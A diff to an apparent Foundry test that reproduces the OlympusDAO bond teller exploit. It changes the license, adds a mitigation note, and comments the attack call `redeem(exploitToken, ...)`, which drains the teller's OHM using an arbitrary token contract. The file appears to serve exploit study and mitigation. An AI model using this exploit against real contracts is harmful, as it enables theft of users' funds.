@@ -1,4 +1,4 @@
-// SPDX-License-Identifier: UNLICENSED
+// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.17;
 
 import "forge-std/Test.sol";
@@ -46,6 +46,7 @@ The function allows arbitraty tokens to be passed as ERC20BondToken. Simply crea
 MITIGATIONS:
 1) Ensure that the tokens passed are allowed and known tokens. Don't allow arbitrary tokens. (e.g. require(isWhitelisted(token_)))
 2) Ensure that the amounts required to be burnt and transfer are respected (also unchecked transfer/burn is made here, use a safeERC20 library)
+3) If arbitratry tokens are meant to be used, evaluate what should happen if wrapped with non standard interfaces.
 */
 
 address constant OHM = 0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5;
@@ -92,7 +93,8 @@ contract Exploit_OlympusDao is Test {
         console.log("Teller: ",IERC20(OHM).balanceOf(BOND_FIXED_EXPIRY_TELLER));
         console.log("Attacker: ",IERC20(OHM).balanceOf(ATTACKER));
         
-        bondExpiryTeller.redeem(exploitToken, initialTellerContractBalance);
+        // We pass the exploit token that has the required properties mentioned before
+        bondExpiryTeller.redeem(exploitToken, initialTellerContractBalance); 
         
         console.log("\nAfter Attack OHM Balance");
         console.log("Teller: ",IERC20(OHM).balanceOf(BOND_FIXED_EXPIRY_TELLER));
